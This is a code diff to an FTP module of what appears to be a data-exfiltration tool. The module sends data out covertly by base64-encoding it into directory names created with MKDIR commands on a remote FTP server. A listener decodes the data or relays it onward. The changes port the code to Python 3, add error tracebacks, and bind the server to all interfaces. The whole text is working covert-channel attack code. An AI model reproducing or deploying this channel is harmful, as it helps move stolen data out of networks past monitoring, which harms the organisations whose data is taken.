@@ -5,6 +5,7 @@ from pyftpdlib.servers import FTPServer
 from pyftpdlib.authorizers import DummyAuthorizer
 from random import choice
 import base64
+import traceback
 
 app_exfiltrate = None
 config = None
@@ -18,7 +19,7 @@ class CustomFTPHandler(FTPHandler):
         app_exfiltrate.log_message('info', "[ftp] Received MKDIR query from {}".format(self.addr))
         data = str(path).split('/')[-1]
         if self.handler == "retrieve":
-            app_exfiltrate.retrieve_data(base64.b64decode(data))
+            app_exfiltrate.retrieve_data(base64.b64decode(data.encode()).decode())
         elif self.handler == "relay":
             relay_ftp_mkdir(data)
         # Recreate behavior of the original ftp_MKD function
@@ -38,11 +39,13 @@ def send(data):
         ftp.connect(target, port)
         ftp.login(user, passwd)
     except:
+        traceback.print_exc()
         pass
 
     try:
-        ftp.mkd(base64.b64encode(data))
+        ftp.mkd(base64.b64encode(data.encode()).decode())
     except:
+        traceback.print_exc()
         pass
 
 def relay_ftp_mkdir(data):
@@ -69,7 +72,7 @@ def init_ftp(data_handler):
     handler = CustomFTPHandler
     handler.authorizer = authorizer
     handler.handler = data_handler
-    server = FTPServer(('', port), handler)
+    server = FTPServer(('0.0.0.0', port), handler)
     server.serve_forever()
 
 def listen():
